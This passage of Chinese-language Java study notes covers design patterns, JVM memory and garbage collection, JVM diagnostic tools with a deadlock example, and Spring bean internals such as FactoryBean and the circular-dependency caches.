所以想要实现迭代器，就需要实现Collection接口，并且在实现返回迭代器方法的地方可以用匿名类来生成迭代器类

```java
class EmployeIterator implements Collection<Employee>{
    private int index = 0;
    private List<Employee> list;
    public EmployeIterator(){
        list = new ArrayList<>();
    }
    @Override
    public Iterator<Employee> iterator() {
        return new Iterator<Employee>() {
            @Override
            public boolean hasNext() {
                return index<list.size();
            }

            @Override
            public Employee next() {
                return list.get(index++);
            }
        };
    }
    @Override
    public boolean add(Employee employee) {
        return list.add(employee);
    }

    @Override
    public boolean remove(Object o) {
        return list.remove(o);
    }
}
```



迭代器优点在于能够以相同方式遍历不同的数据结构元素，用户在遍历时候不需要关心内部实现逻辑，做到统一便用，但是在实现上相对要复杂一点。



### 责任链模式

责任链介绍了请求者处理者之间的耦合程度，减少了代码里的if-else的复杂逻辑关系，请求者不用关心责任链如何传递和处理，只关心处理结果

```java
public class AuthService {
    private static Map<String,Integer> map = new HashMap<>();

    public static Integer queryInfo(String name){
        return map.get(name);
    }

    public static void doAuth(String name){
        int num = 0;
        if(map.get(name)!=null){
            num = map.get(name);
        }
        num++;
        map.put(name,num);
    }
}
//设计一个父类，让其他责任链继承该父类
public abstract class AuthLink {
    protected AuthLink next;
    protected String levelName;
    protected Integer levelId;

    public AuthLink(String levelName, Integer levelId) {
        this.levelName = levelName;
        this.levelId = levelId;
    }

    public AuthLink next(){
        return next;
    }

    public AuthLink appendNext(AuthLink next){
        this.next = next;
        return this;
    }

    public abstract AuthInfo doAuth(String username);
}
//第一个责任节点处理完后交给下一个责任节点
public class Level1Link extends AuthLink {
    public Level1Link(String levelName, Integer levelId) {
        super(levelName, levelId);
    }

    @Override
    public AuthInfo doAuth(String username) {
        Integer integer = AuthService.queryInfo(username);
        if(integer==1){
            return new AuthInfo(levelId,"当前级别为"+integer+"，状态为一级审批人审批中，姓名为:"+this.levelName+"。被审批人"+username);
        }
        AuthLink next = super.next();
        if(next == null){
            return new AuthInfo(levelId+1,"当前级别为"+integer+"，状态为一级审批人完成中，姓名为"+this.levelName+"。被审批人"+username);
        }
        if(integer==2){
            return new AuthInfo(levelId+1,"当前级别为"+integer+"，状态为一级审批人完成中，姓名为"+this.levelName+"。被审批人"+username);
        }
        return next.doAuth(username);
    }
}
//创建责任链
AuthLink authLink = new Level1Link("项目经理",1)
                .appendNext(new Level2Link("CTO",2))
                .appendNext(new Level3Link("董事长",3));
```

==最终输出如下==

```
15:03:31.093 [main] ERROR design.Design - AuthInfo(code=1, info=当前级别为1，状态为一级审批人审批中，姓名为:项目经理。被审批人刘阳)
15:03:31.096 [main] ERROR design.Design - AuthInfo(code=2, info=当前级别为2，状态为一级审批人完成中，姓名为项目经理。被审批人刘阳)
15:03:31.097 [main] ERROR design.Design - AuthInfo(code=3, info=当前级别为3，状态为三级审批人审批中，姓名为:董事长。被审批人刘阳)
15:03:31.097 [main] ERROR design.Design - AuthInfo(code=4, info=当前级别为4，审批流程完成，姓名为董事长。被审批人刘阳)
15:03:31.097 [main] ERROR design.Design - AuthInfo(code=4, info=当前级别为5，审批流程完成，姓名为董事长。被审批人刘阳)
```



责任链的应用很多，著名的如Netty中的ChannelPipline链，控制网络信息的逻辑处理



### 装饰器模式

装饰器模式就像在套娃，它的核心在不改变原有类的基础上给类新增功能，当然也可以选择子类集成和AOP切面来完成。但是==子类集成会导致子类过多，AOP切面较为复杂==

装饰器模式解决了直接继承导致的功能不断横向扩展子类膨胀的问题，装饰器更为灵活

装饰器有四点：

1. 定义抽象接口
2. 实现抽象接口
3. 抽象装饰角色
4. 具体装饰角色

```java
public interface Action {
    public void doAction();
}
//一个实现类
public class PlayAction implements Action {
    @Override
    public void doAction() {
        System.out.println("该孩子可以玩耍");
    }
}
```

下面在编写装饰角色

```java
public abstract class NewAction implements Action {
    private Action action;
    private NewAction(){

    }
    public NewAction(Action action) {
        this.action = action;
    }

    @Override
    public void doAction() {
        this.action.doAction();
    }
}

public class SwimActionDecorator extends NewAction{
    public SwimActionDecorator(Action action) {
        super(action);
    }

    @Override
    public void doAction() {
        super.doAction();
        System.out.println("这孩子还选择了游泳");
    }
}

public class DotaActionDecorator extends NewAction{
    public DotaActionDecorator(Action action) {
        super(action);
    }

    @Override
    public void doAction() {
        super.doAction();
        System.out.println("该孩子打了dota");
    }
}

 @Test
    public void decorator(){
        DotaActionDecorator dotaActionDecorator = new DotaActionDecorator(new SwimActionDecorator(new PlayAction()));
        dotaActionDecorator.doAction();
    }
```

==java中字节流这些就是采用了装饰器模式==

```java
ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
```



### 门面模式

也成为了外观模式，对外提供了简单的接口调用，省略了复杂的细节（包含多个接口的调用）

将复杂的接口简单化，减少了客户端与接口的耦合，可能产生大量的中间类对系统增加了复杂度

![img](java.assets/v2-07f5d83972519c9540e3bf0af7460dfb_b.jpg)

```java
public class ButtonOpen {
    public static void main(String[] args) {
        new Cpu().start();
        new Disk().start();
        new Driver().start();
    }
}
class Cpu{
    public void start(){
        System.out.println("CPU开机了");
    }
}
class Disk{
    public void start(){
        System.out.println("磁盘启动了");
    }
}
class Driver{
    public void start(){
        System.out.println("驱动启动了");
    }
}
```



==日志系统采用了门面模式==

下面的slf4j就是门面模式

![1640694214338](java.assets/1640694214338.png)

slf4j如何决定使用哪个日志框架呢？

- 如果要使用log4j就是需要**slf4j**的包和**log4j**的包，在包括**slf4j-log4j**的适配包
- log4j2配合需要导入适配包**log4j-slf4j-impl****.jar**和log4j2的**log4j-api.jar**、**log4j-core.jar。
- logback只需要导入**logback-classic**和**logback-core.jar**即可，不需要适配包。

![img](java.assets/v2-df52f3ef42e68c48f68c3743739ca9f7_b.jpg)



那么什么是适配包为什么logback不需要适配包呢？

如下为适配包（==适配包实现了slf4j-api下的SPI接口==），最重要的类叫StaticLoggerBinder

![1640694816151](java.assets/1640694816151.png)

slf4j会在该路径下找到该类，因为log4j和log4j2原生没有，所以需要适配包写这个类完成适配

```
private static String STATIC_LOGGER_BINDER_PATH = "org/slf4j/impl/StaticLoggerBinder.class";
```

slf4j在创建LoggerFactory时候就会让StaticLoggerBinder来返回工厂也就是log4j的工厂

这里可以看到从StaticLoggerBinder中获得到的工厂是下面这个工厂

==private final ILoggerFactory loggerFactory = new Log4jLoggerFactory()==

```java
public final class StaticLoggerBinder implements LoggerFactoryBinder {
    public static String REQUESTED_API_VERSION = "1.6";
    private static final String LOGGER_FACTORY_CLASS_STR = Log4jLoggerFactory.class.getName();
    private static final StaticLoggerBinder SINGLETON = new StaticLoggerBinder();
    private final ILoggerFactory loggerFactory = new Log4jLoggerFactory();

    private StaticLoggerBinder() {
    }

    public static StaticLoggerBinder getSingleton() {
        return SINGLETON;
    }

    public ILoggerFactory getLoggerFactory() {
        return this.loggerFactory;
    }

    public String getLoggerFactoryClassStr() {
        return LOGGER_FACTORY_CLASS_STR;
    }
}
```

==至于logback为什么==是因为logback在slf4j后面出来，已经自带了StaticLoggerBinder



### 桥接模式

通过桥接模式把两个相互组合的类型分离出来，其核心事项就是在A类中包含有B类接口，通过构造函数传递B类的实现，==这个B类就是桥==

定义了抽象的pay代表渠道，和接口paymode支付模式，把paymode作为参数传递个pay

```java
public abstract class Pay {
    protected PayMode payMode;

    public Pay(PayMode payMode) {
        this.payMode = payMode;
    }

    public abstract void pay();
}
public interface PayMode {
    public void check();
}
```

下面是相应实现

```java
public class WxPay extends Pay {
    public WxPay(PayMode payMode) {
        super(payMode);
    }

    public void pay() {
        System.out.println("微信支付");
        payMode.check();
    }
}
public class ZfPay extends Pay{
    public ZfPay(PayMode payMode) {
        super(payMode);
    }

    public void pay() {
        System.out.println("支付宝支付");
        payMode.check();
    }
}
//支付模式
public class FingerPayMode implements PayMode {
    public void check() {
        System.out.println("指纹识别支付");
    }
}
public class FacePayMode implements PayMode{
    public void check() {
        System.out.println("人脸识别支付");
    }
}

//输出
 @Test
    public void brige(){
        Pay pay = new WxPay(new FingerPayMode());
        pay.pay();
    }
//微信支付
//指纹识别支付
```



jdbc就是使用了桥接模式，分为了Driver接口和Connection接口





### 区别

**桥接模式**：目的是将接口部分与实现部分分离，从而让他们容易也相对独立的加以改变。比如组合接口和抽象，应对有两个维度的变化

**装饰模式：**装饰者模式在不改变原始类接口的情况下，对原始类功能进行增强，并且支持多个装饰器的嵌套使用。

**适配器模式：**适配器模式是一种事后的补救策略。适配器提供跟原始类不同的接口





### DDD

领域设计模式

![img](java.assets/v2-471a850a6dfcbfda0689fd5731c49fc3_b.jpg)

1. interface基本等同于MVC中的controller
2. application基本等同于MVC中的Service接口，不包含实现类
3. domain包含了各种service逻辑实现
4. infrastructure提供各种工具类和持久化（数据库等）



#### DDD与MVC

MVC中domain中的行为拆分出来放到了service来处理

而DDD赋予了domain行为了状态，具体如下

```
User user = new User();
user.save();
```





## JVM

特点：

- 一次编译，到处运行
- 自动内存管理
- 自动垃圾回收功能



jvm虚拟机基于栈的指令集架构，优点在于跨平台性、指令集小，指令集多，缺点是执行性能低于寄存器





总的结构图

![1645413903495](java.assets/1645413903495.png)



### 类加载器

主要把class文件加载到内存中，供后续执行引擎执行

![1645413936607](java.assets/1645413936607.png)

#### 加载阶段

1. 通过类的全限定名来获取定义此类的二进制流
2. 将字节流所代表的静态存储结构转换为方法区的运行时数据结构
3. 在内存中生成代表该类的class对象，作为方法区这个类的各种数据入口





#### 链接

1. 验证
   1. 母的确保class字节流包含信息符合虚拟机要求
2. 准备
   1. 为类变量初始化赋值为默认值，如0，这里如果static被final修辞段的话，在编译时候就被分配了，准备阶段显示初始化
   2. 类变量被分配在方法区，实例变量会随着对象一起分配到堆
3. 解析
   1. 将常量池内的符号医用转换为直接引用



#### 初始化





#### 自带的加载器

##### 启动类加载器

- 这个类加载使用C/C++实现，嵌套在jvm内部
- 并不继承ClassLoader类
- 只加载少部分安全的类

##### 扩展类加载器

- 加载ext目录下的扩展类

##### 应用程序类加载器

- 负责加载环境变量classpath下的类库
- 是程序的默认类加载器



#### 双亲委派机制

当一个类需要被加载时候，子类加载器会传给上一层加载器，上一层也传给其父类直到最上层加载器，最上层加载器查看自己能否加载，能则加载，不能则交给下层加载。

![1645428281379](java.assets/1645428281379.png)





### 运行时数据区



![1645532879423](java.assets/1645532879423.png)

各部分是否共享和有什么异常

![1645681366792](java.assets/1645681366792.png)



#### 虚拟机栈

> 栈是运行时的单位，堆是存储的单位

每个线程在创建时候都会有对应的虚拟机栈，是线程私有的



栈不存在垃圾回收问题，但存在栈溢出问题





##### 栈帧

线程上每个方法对应栈帧，栈帧是一个内存区域，维系着方法执行过程中的各种数据信息

![1645535209865](java.assets/1645535209865.png)

一个栈帧内部包括了：

- 局部变量表
  - 用于存储方法参数和局部变量，==不存在数据安全问题==
  - 局部变量表的最基本单位为slot，long和double占用两个slot，其他类型占用1个slot，==this引用会放在第一个位置==
  - 所需的容量在编译器确定
- 操作数栈
  - 主要用于保存计算的中间结果，同时为计算过程变量提供临时存储空间
  - 在编译器确定深度
- 动态链接
  - 将符号引用转换为直接引用
  - 例子：  下面左边的就是符号引用，右边人能看懂的是直接引用
  - #26 = Utf8               com/example/jvm/StackTest
- 方法返回地址



##### 符号引用有三类

1. 类和接口的全限定名
2. 字段的名称和描述符
3. 方法的名称和描述符



##### 方法的调用

- 静态链接：编译期就把符号引用转换为直接引用
- 动态链接：运行期才把符号引用转换为直接引用



#### 堆

堆中对每个线程都有一个独有的缓冲区叫**TLAB**

堆是GC垃圾回收的重点区域



##### 内存细分

- java7之前是新生区+老年区和永久区
- java8之后是新生区+老年区+元空间

永久代和元空间实际上又是==方法区的实现方式==



> -Xms用来设置堆空间的初始内存大小

> -Xmx用来设置堆空间的最大大小



默认情况新生代：老年代为1:2

eden和s0/s1的比例是8:1:1

![1645622374534](java.assets/1645622374534.png)

###### 新生代对象分配与回收

**MinorGC**：用来处理eden已满的情况。

当对象在MinorGC存活下来后，放到s0或s1中，并标记上年龄，同时s0中的对象如果存活放在s1中，增加年龄，之后s1又放到s0中，到对象年龄超过15后，就放到老年代区。

==会引发STW(stop the world)暂停用户线程，等垃圾回收结束后，用户线程才恢复==

注意：垃圾回收常在新生代，少在老年代，几乎不再元空间收集。

**MajorGC**：用来处理老年代的对象

比MinorGC慢

**FullGC**：收集整个java堆和方法区的垃圾收集

触发情况

1. ​	调用System.gc()
2.  老年代空间不足
3. 方法区空间不足
4. 经过minorgc进入老年代的对象大于其老年代可用内存
5. surviror区相互复制时候，对象大于s区后，要放到老年代，但老年代内存不足



![1645672581741](java.assets/1645672581741.png)

###### TLAB

由于堆是线程共享区域，并发环境下在堆中划分内存空间是线程不安全的，如果加锁，会影响分配速度

提出了TLAB来解决这个问题

每个线程都有私有的缓存区域，该区域是在==eden区域内==，默认情况下仅占1%

 ![1645673074074](java.assets/1645673074074.png)

###### 堆空间参数

-Xms用来设置堆空间的初始内存大小

-Xmx用来设置堆空间的最大大小

-Xmn新生代的大小

-XX:NewRation新生代与老年代比例

-XX:SurvivorRation新生代的Eden和s0/s1比例

-XX:+PrintGCDetails输出详细gc日志

-XX:MaxTenuringThreshold：设置新生代垃圾最大年龄

-XX:HandlePromotionFailure：是否设置空间分配担保
	该参数在jd7后没有用了，只要老年代的连续空间大于新生代对象总大小或者历次晋升的平均大小就会进行MinorGC



##### 逃逸分析

随着JIT编译器的发展和逃逸技术的发展，堆不再是唯一分配对象的位置

==如果经过逃逸分析发现，一个对象没有逃离出方法的话，就可能被优化为栈上分配，对象被分解为标量存在栈上==



逃逸分析基本行为就是分析对象动态作用域：

> 注意判断new的对象实体有没有被外部引用

- 当一个对象在方法中被定义后，对象只在方法内部使用，则认为没有发生逃逸
- 当一个对象在方法被定义后，他被外部方法所引用，则认为发生逃逸，例如作为调用参数被传递到其他方法中



逃逸分析优化方式：

1. 栈上分配
2. 同步消除：JIT判断一个同步块如果只有一个线程访问，那么 就消除同步锁
3. 标量替换：如果一个对象不被外界访问，那么就会把对象分解为成员变量作为标量，标量是java中的最小单位

```java
class Point{
        int x;
        int y;
    }
void haha(){
        Point point = new Point();
        point.x = 1;
        point.y = 2;
        //标量替换为下面的
        int x = 1;
        int y = 2;
    }
```



#### 方法区

该区逻辑上属于堆得一部分，具体实现上独立于堆

##### 栈堆方法区的相互关系

![1645681879883](java.assets/1645681879883.png)

![1645681884541](java.assets/1645681884541.png)



##### 方法区的演进

- java7之前是新生区+老年区和永久区
- java8之后是新生区+老年区+元空间

永久代和元空间实际上又是==方法区的实现方式==

元空间不再虚拟机设置的内存中，而是使用本地内存



##### 内部结构

方法区主要存储类信息、常量、静态变量、JIT的代码缓存

![1645684649892](java.assets/1645684649892.png)

常量池存了字面量，类型、字段、方法的符号引用

常量池通过类加载器放到运行时数据区后，称为==运行时常量池==

​	与常量池不同，运行时常量池存的不再是符号引用而是实际的地址



在jdk7后，静态变量和字符串常量池放在了堆中，如下图

![1645689056509](java.assets/1645689056509.png)

###### 为什么要改成元空间？

1. 为永久代设置空间大小很难，因为各种第三方jar用了大量的动态反射技术，会产生很多不确定的类，元空间使用本地内存
2. 因为sun收购了jrocket虚拟机，要进行兼容



### 对象的实例化与内存布局

#### 创建对象的方式

1. new对象
2. class的newInstance()只能调用空参
3. Constructor的newInstance()
4. 调用clone（），类实现Cloneable接口
5. 反序列化：从文件网络中获取对象二进制流
6. 第三方库



#### 创建对象的步骤

1. 判断对象对应类是否加载、链接、初始化
2. 为对象分配内存
   1. 如果内存规整：用**指针碰撞**（就是用指针把空间一分为二，当分配内存后，指针移动）
   2. 如果内存不规整：维护**空闲列表**保存没有使用的内存
3. 处理并发安全问题
   1. 采用CAS保证更新
   2. 为线程分配TLAB
4. 初始化分配到的空间（给默认值）
5. 设置对象的对象头
6. 使用init方法进行显示初始化





#### 对象的内存布局

以下面代码创建的对象为例

```java
public class StackTest {
    public static void main(String[] args) throws InterruptedException {
        Customer customer = new Customer();
    }

}
class Customer{
    private int id;
    private String name;
    private Acccount account;

    public Customer(){
        id = 1001;
        name = "匿名客户";
        account = new Acccount();
    }
}
class Acccount{}
```

可以画出下面的示例图来展示对象在虚拟机中的内存布局

![1645759500854](java.assets/1645759500854.png)



#### 对象的访问方式

两种

- 句柄访问
  - 该方法如果发生垃圾回收实例数据地址改变，不会改变栈中指向堆得指针，只需要改变句柄池指针
  - ![1645759991060](java.assets/1645759991060.png)
- 直接指针
  - hotspot用的是这种方式
  - 该方法访问更快
  - ![1645760006200](java.assets/1645760006200.png)



### 执行引擎

将字节码指令解释/编译为对应平台上的本地机器指令

执行引擎同时拥有**解释器**和**JIT编译器**



解释器：当jvm启动时根据规范对字节码采用逐行解释的方法，然后直接执行

JIT编译器：将虚拟机源代码直接翻译为本地机器平台的机器语言



### 字符串

#### 字符串拼接

- 常量与常量的拼接结果在常量池，原理是编译期优化

  - ```
    final String s1 = "a";
    final String s2 = "b";
    String s3 = "ab";
    String s = s1+s2;
    s==s3 //true
    原理在于s1和s2现在不是变量而是常量。
    ```

    

- 常量池不会存在相同的常量

- 只要其中一个是变量，结果就在堆中（相当于new了对象），变量拼接的原理是StringBuilder

  - ```
    String s = s1+s2
    等价于创建一个StringBuilder对象，并调用其append方法
    ```

- 如果拼接的结果调用了intern方法，则主动将常量池没有的字符串放入池中，并返回此对象地址





通过StringBuilder的append方法的拼接要优于String自身的拼接操作，原因在于：

1. String自身拼接会不断创建StringBuilder对象和String对象
2. 创建过多的对象可能会造成频繁gc

对上面还可以改进，在实际开发中，可以在其构造函数中规定一个最大值，可以使得其byte数组不会因为扩容不断复制



#### intern()

intern确保常量池的字符只有一份，这样可以节约空间，加快字符串操作的执行速度，非常重要。

如果用的是new String()后面最好加上intern



##### 面试题

1、new  String("ab")会创建几个对象？

​	答：一个在是new在堆空间创建的对象，另外一个在常量池中的对象

2、new String("a")+new String("b")会创建几个对象？

​	答：一共5个，new了一个StringBuilder对象，new了两个String对象，字符串常量池添加了a和b常量的对象，==其实在Stringbuilder返回的toString方法中又创建了一个string对象==，同时注意字符串常量池中不会有ab



3、

```java
String a = new String("a")+new String("b");//a接受的是new String("ab")对象，并且没有在常量池生成ab
a.intern();//在常量池生成对象   注意在jdk7以后，因为字符串常量池搬到了堆中，因为在上面已经在堆中生成了ab对象，那么就不会再创建ab对象了，而是引用了ab对象
String b = "ab";
System.out.println(a==b);//true  ，所以其实两个指向的是一个位置
```



### 垃圾回收

垃圾：运行程序中没有任何指针指向该对象



#### 垃圾回收算法

##### 标记阶段

识别哪些是垃圾



###### 引用计数法

每个对象保存一个整形的引用计数器属性，如果引用计数器为0，该对象可进行回收

优点：实现简单，易于判断

缺点：需要每个对象单独存储计数器；无法处理循环引用



###### 可达性分析算法

java采用的标记算法，可以解决循环引用

只要没有被GC ROOTS直接或间接连接的对象就是垃圾

![1645874871305](java.assets/1645874871305.png)

GC ROOTS的种类：

1. 虚拟机栈中引用的对象
2. 本地方法栈引用的对象
3. 静态变量引用的对象
4. 字符串常量池引用
5. 被同步锁持有的对象



##### 清除阶段

清除垃圾

###### 标记清除

​	标记的是可达对象，然后遍历堆清除掉没有被标记的对象 

![1645876393919](java.assets/1645876393919.png)

​	缺点：

1. 效率不高
2. 进行gc需要停止整个应用程序
3. 容易产生内存碎片，需要额外维护一个空闲列表



###### 标记复制

​	将内存空间分为两块，每次只使用其中一块，垃圾回收时候把使用的一块的存活对象复制到另外一块空间。 

​	实际上survivor区的s1和s2就是使用了该算法

![1645876675071](java.assets/1645876675071.png)

​	优点：

1. 实现简单，运行高效
2. 没有碎片



​	缺点：

1. 需要两倍的内存空间

   

###### 标记整理

用于老年代的收集算法

![1645876956109](java.assets/1645876956109.png)

优点：

1. 没有碎片，不需要空闲列表维护
2. 消除了复制算法需要两倍内存的代价

缺点：

1. 效率低于复制算法
2. 移动过程需要暂停用户程序
3. 移动对象时候被其他对象引用，需要调整引用地址



#### 内存泄露

严格来说，只有对象不被程序用到，但gc又不会回收到他，最终会导致内存溢出



举例：

1. 单例模式
   1. 单例模式生命周期长，如果持有其他引用，那么其他引用指向的对象就不会被回收，导致内存泄露
2. 数据库连接、网络、IO没有关闭close，就会导致资源内存泄露



#### 引用级别

我们希望一类对象，在内存足够的时候保留在内存，如果内存不够，就被垃圾回收

下面的引用强度依次减弱

- 强引用：最常使用的
- 软引用：内存溢出之前，在第二次收集时候，如果没有足够内存，才会回收
- 弱引用：只能生存到下一次垃圾回收之前，只要垃圾回收就会被清除
- 虚引用：该引用唯一目的是能在这个对象被垃圾收集时候收到系统通知



##### 面试题

用过weakhashmap吗？



#### 垃圾收集器

主要关注吞吐量和低延迟

当前标准：在最大吞吐量优先的情况下，降低停止时间



##### 经典垃圾回收器

- 串行：Serial、Serial old
- 并行：ParNew、Parallel Scavenge、Parallel Old
- 并发：CMS、G1

与垃圾分代之间的关系

![1645970211252](java.assets/1645970211252.png)



垃圾收集器的组合关系

红虚线是jdk8之前的组合关系

绿虚线是jdk14去除了

==jdk8默认使用Parallel GC和Parallel Old GC==

![1645970251943](java.assets/1645970251943.png)

##### Serial回收器

最老的回收期

采用复制算法、串行回收和STW机制

老年代使用 Serial Old回收器，采用标记整理算法



优点：简单高效

缺点：吞吐量低，延迟高



##### ParNew

处理新生代的回收器，运行与多cpu上

在Serial基础上使用了并行的方式



优点：相对Serial，吞吐量高



##### Parallel

并行、复制算法、吞吐量优先、自适应调节策略（自动内存分配）

与Parallel old配合使用，old用来并行处理老年代，使用标记压缩算法



##### CMS

面试重点收集器

1.5推出的第一款并发收集器，第一次实现了垃圾收集线程与用户线程同时工作

特点是低延迟

CMS采用标记清除算法



工作原理

- 初始标记：用户线程STW，仅仅标记GC ROOTS能直接关联到的对象，速度非常快
- 并发标记：从GC ROOTS的直接关联对象遍历整个对象图
- 重新标记：修正并发标记期间，用户线程继续运行导致标记产生变动的一部分对象的标记
- 并发清除：并发清除死亡对象，释放内存

![1646014676215](java.assets/1646014676215.png)



缺点：

- 产生内存碎片
- 对CPU资源非常敏感，降低吞吐量
- 无法处理在并发标记阶段产生新垃圾对象



##### G1区域分代化

![1646016632638](java.assets/1646016632638.png)

官方给其目标是延迟可控的情况下获得尽可能高的吞吐量

G1是分区算法，可以处理新生代和老年代



使用不同的Region来处理eden、s0、s1和老年代，每次回收Region价值最高的，所以叫G1（Garbage first）

==jdk9的默认回收器==



优点：

1. 同时兼顾并行与并发
2. 分代收集，并且所有区域在物理上不要求连续
3. Region使用复制算法，整体上是标记整理算法
4. 限制停顿时间（G1只需要对部分区域进行回收）

缺点：

​	占用更多的内存空间



使用场景：

- 面向服务器端，大内存、多处理器
- 用来替换掉CMS
  - 超过一半的java堆被活动数据占用
  - 对象分配频率变化很大
  - GC停顿时间长（0.5-1秒）









##### 口诀

- 最小化使用内存和并行开销，用Serial
- 最大化应用程序的吞吐量，用Parallel
- 最小化GC的中断，用CMS

![1646030865466](java.assets/1646030865466.png)







### 性能调优

#### 工具

jps

> 虚拟机进程状况工具

```linux
liquid@liquiddeMacBook-Air Desktop % jps
94533 Jps
74758 
85929 Kafka
93416 Launcher
79853 
94463 Main
```



jstat

> 监视虚拟机各种运行状态
>
> 常用命令如下显示占据总空间的百分比

```
liquid@liquiddeMacBook-Air Desktop % jstat -gcutil 85929
  S0     S1     E      O      M     CCS    YGC     YGCT    FGC    FGCT     GCT   
  0.00  92.56  10.40  35.82  98.68  94.78     29    0.862     0    0.000    0.862
```



jmp

> 获得虚拟机进程的堆快照



jhat

> 用来分析jmp生成的dump文件，并且通过http在网页端展示信息
>
> 不过一般不会使用该命令，而使用VisualVM或者Eclipse Memory Analyzer



jstack

> 用于获取当前时刻的线程快照，用来定位线程长时间停顿原因，能发现死锁

我们下面模拟代码出现死锁，用jstack来发现

下面的java代码，线程1持有了锁1，想要获得🔒2，线程2持有了🔒2，想要获得🔒1

```java
public class Test {
    public static void main(String[] args) {
        Object object = new Object();
        Object object1 = new Object();
        new Thread(()->{
            synchronized (object){
                try {
                    System.out.println(Thread.currentThread().getName()+"获取到1锁");
                    TimeUnit.SECONDS.sleep(5);
                    synchronized (object1){
                        System.out.println(Thread.currentThread().getName()+"获取到2锁");
                    }
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
            }
        }).start();

        new Thread(()->{
            synchronized (object1){
                try {
                    System.out.println(Thread.currentThread().getName()+"获取到2锁");
                    TimeUnit.SECONDS.sleep(5);
                    synchronized (object){
                        System.out.println(Thread.currentThread().getName()+"获取到1锁");
                        System.out.println("2");
                    }
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
            }
        }).start();
    }
}
```

可以发现jstack发现了死锁，给出了线程和锁的具体信息

```
ava stack information for the threads listed above:
===================================================
"Thread-1":
	at com.cuit.Test.lambda$main$1(Test.java:30)
	- waiting to lock <0x000000076ad2caa0> (a java.lang.Object)
	- locked <0x000000076ad2cab0> (a java.lang.Object)
	at com.cuit.Test$$Lambda$2/728890494.run(Unknown Source)
	at java.lang.Thread.run(Thread.java:750)
"Thread-0":
	at com.cuit.Test.lambda$main$0(Test.java:16)
	- waiting to lock <0x000000076ad2cab0> (a java.lang.Object)
	- locked <0x000000076ad2caa0> (a java.lang.Object)
	at com.cuit.Test$$Lambda$1/1190654826.run(Unknown Source)
	at java.lang.Thread.run(Thread.java:750)

Found 1 deadlock.
```



VisualVm

> 整合上面所有的功能且是官方的工具并且免费




# 框架源码

## Spring

1. Spring读取配置文件类，读取其的@ComponetScan所需要扫描的类路径
2. 使用类加载器读取下面的所有类，如果类上有@Component等注解的话，把该类封装为BeanDefinition，并且放到beanDefinitionMap中
3. 完成扫描后，Spring对所有属性为单例的类，实例化，并放到singletonMap，方便后面getBean获取，并且在实例化的时候需要查看是否属性字段有@Autowired等注解，如果有给该字段注入属性对应值

### bean生命周期

1. class加载
2. 实例化
3. 得到原始对象
4. 属性填充
5. 后置处理器前调
6. 初始化实现InitlizationBean接口
7. 后置处理器后调
7. 调用销毁方法





### factoryBean和BeanFactory

beanfactory是IOC容器的顶层接口，定义了获得bean等方法



而factoryBean是可以自己手动new一些bean的接口，多用于与第三方框架配合，如mybatis的SqlSessionFactoryBean

我们先看里面有哪些方法

​	getObject就是获取自定义的对象

​	getObjectType就是自定义对象的类型

![截屏2022-03-28 下午4.35.05](java.assets/截屏2022-03-28 下午4.35.05.png)

 

小栗子：

一个简单的自定义对象Liquid

```java
@Getter
@Setter
public class Liquid {

    private int id;
    private String name;
}

//然后编写FactoryBean
public class LiquidFactoryBean implements FactoryBean<Liquid> {
    @Override
    public Liquid getObject() throws Exception {
        Liquid liquid = new Liquid();
        liquid.setId(1);
        liquid.setName("mavis");
        return liquid;
    }

    @Override
    public Class<?> getObjectType() {
        return Liquid.class;
    }
}

```

之后我们向spring容器注册bean，使用@bean注解来

```java
@Configuration
public class Config {
    @Bean
    public LiquidFactoryBean liquidBean(){
        LiquidFactoryBean liquidFactoryBean = new LiquidFactoryBean();
        return liquidFactoryBean;
    }
}

//之后通过获取liquidBean这个名字就可以获得liquid对象了
AnnotationConfigApplicationContext context = new AnnotationConfigApplicationContext(Config.class);
Liquid liquidBean = (Liquid)context.getBean("liquidBean");
System.out.println(liquidBean.getName());
```

spring框架获取到FactoryBean后会调用他的getObject来获取自定义Bean对象





### aware接口

在prepareBeanFactory方法中会添加一个ApplicationContextAwareProcessor类到后置处理器列表中

他会在bean初始化之前调用aware接口的方法设置属性值

```java
private void invokeAwareInterfaces(Object bean) {
		if (bean instanceof EnvironmentAware) {
			((EnvironmentAware) bean).setEnvironment(this.applicationContext.getEnvironment());
		}
		if (bean instanceof EmbeddedValueResolverAware) {
			((EmbeddedValueResolverAware) bean).setEmbeddedValueResolver(this.embeddedValueResolver);
		}
		if (bean instanceof ResourceLoaderAware) {
			((ResourceLoaderAware) bean).setResourceLoader(this.applicationContext);
		}
		if (bean instanceof ApplicationEventPublisherAware) {
			((ApplicationEventPublisherAware) bean).setApplicationEventPublisher(this.applicationContext);
		}
		if (bean instanceof MessageSourceAware) {
			((MessageSourceAware) bean).setMessageSource(this.applicationContext);
		}
		if (bean instanceof ApplicationStartupAware) {
			((ApplicationStartupAware) bean).setApplicationStartup(this.applicationContext.getApplicationStartup());
		}
		if (bean instanceof ApplicationContextAware) {
			((ApplicationContextAware) bean).setApplicationContext(this.applicationContext);
		}
	}
```





### 循环依赖

- 一级缓存放完全状态的bean
- 二级缓存实力化完成但未初始化的bean
- 三级缓存存储获取对象的一个匿名内部类



在DefaultSingletonBeanRegistry这个类中

根据里面逻辑先去一级缓存找，没有就去二级缓存，双重检验再查一二级而缓存，没有的话就从三级缓存工厂中获取bean，放到二级缓存（这里是一个半成品bean），从三级缓存中删除

```java
protected Object getSingleton(String beanName, boolean allowEarlyReference) {
		// Quick check for existing instance without full singleton lock
		Object singletonObject = this.singletonObjects.get(beanName);
		if (singletonObject == null && isSingletonCurrentlyInCreation(beanName)) {
			singletonObject = this.earlySingletonObjects.get(beanName);
			if (singletonObject == null && allowEarlyReference) {
				synchronized (this.singletonObjects) {
					// Consistent creation of early reference within full singleton lock
					singletonObject = this.singletonObjects.get(beanName);
					if (singletonObject == null) {
						singletonObject = this.earlySingletonObjects.get(beanName);
						if (singletonObject == null) {
							ObjectFactory<?> singletonFactory = this.singletonFactories.get(beanName);
							if (singletonFactory != null) {
								singletonObject = singletonFactory.getObject();
								this.earlySingletonObjects.put(beanName, singletonObject);
								this.singletonFactories.remove(beanName);
							}
						}
					}
				}
			}
		}
		return singletonObject;
```



还有bean完成实力化和初始化后添加到一级缓存

```java
protected void addSingleton(String beanName, Object singletonObject) {
		synchronized (this.singletonObjects) {
			this.singletonObjects.put(beanName, singletonObject);
			this.singletonFactories.remove(beanName);
